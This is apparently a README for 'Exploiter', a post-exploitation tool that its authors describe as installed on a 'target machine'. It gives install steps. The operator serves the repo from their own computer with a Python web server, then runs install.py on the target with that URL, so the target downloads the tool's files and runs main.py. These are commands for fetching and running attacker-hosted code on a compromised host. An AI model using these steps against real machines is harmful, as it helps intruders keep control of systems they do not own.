## THE Exploiter

Exploiter is an easy to setup post exploitation tool. It can be installed on your target machine realy easily !

## Installation

First of all, you will need to upload this repo to the target. But, the `install.py` does it for you !

You will need to upload only this file, and launch it. It will download all necessary files.

If your target can not access the "outside" internet, and can not retreive github files, you can host them on your computer :

Run the following commands on the root directory of this repo (on your machine) :

    ifconfig
    python -m http.server 8080

This will host a webserver on your machine.

Using the output of the `ifconfig` command, craft your URL : it will be `http://{IFCONFIG IP OUTPUT}:8080/`

Once you have your URL, run `install.py` on the target machine, but put your URL as argument :

If your IP is `192.168.0.7`, run `python install.py http://192.168.0.7:8080/` on your target.

Once that done, it's downloaded !

You can find a `main.py` file in the current remote directory. Launch it to get Exploiter working !
